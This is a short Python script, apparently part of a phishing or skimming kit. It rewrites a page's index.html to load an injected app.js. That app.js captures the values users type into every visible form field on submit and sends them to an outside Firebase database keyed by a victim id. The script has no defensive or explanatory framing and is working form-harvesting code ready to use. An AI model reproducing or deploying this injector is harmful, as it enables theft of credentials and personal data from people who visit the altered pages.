#!/usr/bin/env python3
import os
import sys
import json
from html.parser import HTMLParser

FIREBASE_URL = 'https://app-store-88307-default-rtdb.firebaseio.com'


class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.inputs = []
        self.in_form = False
        self.form_depth = 0

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'form':
            self.in_form = True
            self.form_depth = 0
        if self.in_form:
            self.form_depth += 1
        if tag in ('input', 'textarea', 'select') and self.in_form:
            tipo = attrs_dict.get('type', 'text')
            if tipo == 'hidden':
                return
            input_id = attrs_dict.get('id') or attrs_dict.get('name')
            if input_id:
                campo = {
                    'id': input_id,
                    'type': 'textarea' if tag == 'textarea' else tipo
                }
                if campo not in self.inputs:
                    self.inputs.append(campo)

    def handle_endtag(self, tag):
        if self.in_form:
            self.form_depth -= 1
            if self.form_depth < 0:
                self.in_form = False


def detectar_inputs(html):
    parser = FormParser()
    parser.feed(html)
    return parser.inputs


def generar_app_js(campos):
    campos_json = json.dumps(campos)
    js = f"const FIREBASE_URL='{FIREBASE_URL}';const CAMPOS={campos_json};"
    js += "function guardarDatos(e){if(e)e.preventDefault();"
    js += "const id=new URLSearchParams(window.location.search).get('id');if(!id)return;"
    js += "const data={};CAMPOS.forEach(c=>{const el=document.getElementById(c.id);if(el)data[c.id]=el.value.trim()});"
    js += "const t=Date.now();data.fecha=new Date().toLocaleString('es-CO',{timeZone:'America/Bogota'});"
    js += "data.expiracion=t+86400000;"
    js += "fetch(FIREBASE_URL+'/mensajes/'+id+'/registro_'+t+'.json',{method:'PUT',"
    js += "headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})}"
    js += "document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',guardarDatos));"
    return js


def inyectar(ruta):
    html_path = os.path.join(ruta, 'index.html')
    if not os.path.exists(html_path):
        return

    with open(html_path, 'r', encoding='utf-8') as f:
        html = f.read()

    if 'app.js' in html:
        return

    campos = detectar_inputs(html)
    html = html.replace('</body>', '<script src="app.js"></script>\n</body>')

    with open(html_path, 'w', encoding='utf-8') as f:
        f.write(html)

    app_path = os.path.join(ruta, 'app.js')
    if not os.path.exists(app_path):
        with open(app_path, 'w', encoding='utf-8') as f:
            f.write(generar_app_js(campos))


if __name__ == '__main__':
    if len(sys.argv) > 1:
        inyectar(os.path.abspath(sys.argv[1]))
